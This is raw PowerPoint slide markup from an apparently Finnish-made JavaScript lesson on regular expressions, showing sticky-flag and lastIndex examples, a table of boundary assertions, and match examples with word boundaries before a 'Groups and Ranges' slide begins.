                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>Han</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="2000" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="811F3F"/>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gu</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="2000" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>);</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="fi-FI" sz="2000" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
            </a:b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m</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zh-CN" altLang="fi-FI" sz="2000" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="008000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>你们好</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" altLang="zh-CN" sz="2000" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="008000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>", "</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="fi-FI" sz="2000" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="008000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>我是老师</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" altLang="zh-CN" sz="2000" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="008000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>"]</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="fi-FI" altLang="zh-CN" sz="2000" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="008000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
            </a:b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str</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The</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End</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regexp</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="2000" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t> =</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="2000" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="811F3F"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t> /\w</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a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="2000" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0000FF"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>y</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="2000" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>;</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="fi-FI" sz="2000" b="0" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="001080"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>regexp</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lastIndex</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="2000" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t> = </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="2000" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="098658"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>3</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starting</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="2000" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="008000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t> position</a:t>
            </a:r>
            <a:endParaRPr lang="fi-FI" sz="2000" b="0" dirty="0">
              <a:solidFill>
                <a:srgbClr val="000000"/>
              </a:solidFill>
              <a:effectLst/>
              <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pP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regexp</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exec</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str</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null</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001080"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>regexp</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lastIndex</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="2000" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t> = </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="2000" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="098658"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>4</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starting</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="2000" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="008000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t> position</a:t>
            </a:r>
            <a:endParaRPr lang="fi-FI" sz="2000" b="0" dirty="0">
              <a:solidFill>
                <a:srgbClr val="000000"/>
              </a:solidFill>
              <a:effectLst/>
              <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pP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regexp</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exec</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str</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End</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="2000" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="008000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>"</a:t>
            </a:r>
            <a:endParaRPr lang="fi-FI" sz="2000" b="0" dirty="0">
              <a:solidFill>
                <a:srgbClr val="000000"/>
              </a:solidFill>
              <a:effectLst/>
              <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:endParaRPr lang="zh-CN" altLang="fi-FI" sz="2000" b="0" dirty="0">
              <a:solidFill>
                <a:srgbClr val="000000"/>
              </a:solidFill>
              <a:effectLst/>
              <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:endParaRPr lang="fi-FI" sz="2000" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="268519269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AD2AE5C-4ECC-4AFD-9783-C71F03CEACA9}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Boundary Type Assertions</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:graphicFrame>
        <p:nvGraphicFramePr>
          <p:cNvPr id="4" name="Taulukko 4">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{98398696-5430-4D06-AE9C-8206D1FFD5F7}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvGraphicFramePr>
            <a:graphicFrameLocks noGrp="1"/>
          </p:cNvGraphicFramePr>
          <p:nvPr>
            <p:ph sz="half" idx="1"/>
            <p:extLst>
              <p:ext uri="{D42A27DB-BD31-4B8C-83A1-F6EECF244321}">
                <p14:modId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="115901091"/>
              </p:ext>
            </p:extLst>
          </p:nvPr>
        </p:nvGraphicFramePr>
        <p:xfrm>
          <a:off x="609600" y="1600200"/>
          <a:ext cx="10972800" cy="1854200"/>
        </p:xfrm>
        <a:graphic>
          <a:graphicData uri="http://schemas.openxmlformats.org/drawingml/2006/table">
            <a:tbl>
              <a:tblPr firstRow="1" bandRow="1">
                <a:tableStyleId>{5C22544A-7EE6-4342-B048-85BDC9FD1C3A}</a:tableStyleId>
              </a:tblPr>
              <a:tblGrid>
                <a:gridCol w="1597968">
                  <a:extLst>
                    <a:ext uri="{9D8B030D-6E8A-4147-A177-3AD203B41FA5}">
                      <a16:colId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" val="1833601924"/>
                    </a:ext>
                  </a:extLst>
                </a:gridCol>
                <a:gridCol w="9374832">
                  <a:extLst>
                    <a:ext uri="{9D8B030D-6E8A-4147-A177-3AD203B41FA5}">
                      <a16:colId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" val="547785559"/>
                    </a:ext>
                  </a:extLst>
                </a:gridCol>
              </a:tblGrid>
              <a:tr h="370840">
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr lang="en-US" noProof="0"/>
                        <a:t>Character</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr/>
                </a:tc>
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr lang="en-US" noProof="0"/>
                        <a:t>Meaning</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr/>
                </a:tc>
                <a:extLst>
                  <a:ext uri="{0D108BD9-81ED-4DB2-BD59-A6C34878D82A}">
                    <a16:rowId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" val="2092220161"/>
                  </a:ext>
                </a:extLst>
              </a:tr>
              <a:tr h="370840">
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr lang="en-US" noProof="0"/>
                        <a:t>^</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr/>
                </a:tc>
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr lang="en-US" noProof="0" dirty="0"/>
                        <a:t>Matches the beginning of string or after new line in multiline mode (m).</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr/>
                </a:tc>
                <a:extLst>
                  <a:ext uri="{0D108BD9-81ED-4DB2-BD59-A6C34878D82A}">
                    <a16:rowId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" val="2862126487"/>
                  </a:ext>
                </a:extLst>
              </a:tr>
              <a:tr h="370840">
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr lang="en-US" noProof="0" dirty="0"/>
                        <a:t>$</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr/>
                </a:tc>
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr lang="en-US" noProof="0" dirty="0"/>
                        <a:t>Matches the end of input or before newline character in multiline mode (m)</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr/>
                </a:tc>
                <a:extLst>
                  <a:ext uri="{0D108BD9-81ED-4DB2-BD59-A6C34878D82A}">
                    <a16:rowId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" val="1081986135"/>
                  </a:ext>
                </a:extLst>
              </a:tr>
              <a:tr h="370840">
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr lang="en-US" noProof="0" dirty="0"/>
                        <a:t>\b</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr/>
                </a:tc>
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr lang="en-US" noProof="0" dirty="0"/>
                        <a:t>Matches a word boundary</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr/>
                </a:tc>
                <a:extLst>
                  <a:ext uri="{0D108BD9-81ED-4DB2-BD59-A6C34878D82A}">
                    <a16:rowId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" val="1291162183"/>
                  </a:ext>
                </a:extLst>
              </a:tr>
              <a:tr h="370840">
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr lang="en-US" noProof="0" dirty="0"/>
                        <a:t>\B</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr/>
                </a:tc>
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr lang="en-US" noProof="0" dirty="0"/>
                        <a:t>Matches a non-word boundary</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr/>
                </a:tc>
                <a:extLst>
                  <a:ext uri="{0D108BD9-81ED-4DB2-BD59-A6C34878D82A}">
                    <a16:rowId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" val="647007802"/>
                  </a:ext>
                </a:extLst>
              </a:tr>
            </a:tbl>
          </a:graphicData>
        </a:graphic>
      </p:graphicFrame>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="5" name="Sisällön paikkamerkki 4">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{F0227BA0-FCB3-4A29-BB37-0586A23AB56E}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph sz="half" idx="2"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="609600" y="3636962"/>
            <a:ext cx="10972800" cy="2489202"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="fi-FI" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="001080"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>m</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t> = </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="A31515"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>"JavaScript and Java"</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>.</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" b="0" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="795E26"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>match</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>(</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="811F3F"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>/Java/</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0000FF"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>g</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>);</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="fi-FI" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="001080"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>console</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>.</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="795E26"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>log</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>(</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="001080"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>m</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["Java", "Java"]</a:t>
            </a:r>
            <a:endParaRPr lang="fi-FI" b="0" dirty="0">
              <a:solidFill>
                <a:srgbClr val="000000"/>
              </a:solidFill>
              <a:effectLst/>
              <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="fi-FI" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="001080"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>m</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t> = </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="A31515"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>"JavaScript and Java"</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>.</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" b="0" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="795E26"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>match</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>(</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="811F3F"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>/</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="EE0000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>\</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" b="0" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="EE0000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>b</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" b="0" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="811F3F"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>Java</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="EE0000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>\b</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="811F3F"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>/</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0000FF"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>g</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>);</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="fi-FI" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="001080"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>console</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>.</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="795E26"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>log</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>(</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="001080"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>m</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["Java"]</a:t>
            </a:r>
            <a:endParaRPr lang="fi-FI" b="0" dirty="0">
              <a:solidFill>
                <a:srgbClr val="000000"/>
              </a:solidFill>
              <a:effectLst/>
              <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:endParaRPr lang="fi-FI" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="23994624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49AEE15-C6C8-4AC7-B686-41D5ADE9C20A}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Groups</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>and Ranges</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:graphicFrame>
        <p:nvGraphicFramePr>
          <p:cNvPr id="4" name="Taulukko 4">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{7BF786D6-8FE0-44ED-8D1A-F23E78BD713D}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvGraphicFramePr>
            <a:graphicFrameLocks noGrp="1"/>
          </p:cNvGraphicFramePr>
          <p:nvPr>
            <p:ph sz="half" idx="1"/>
            <p:extLst>
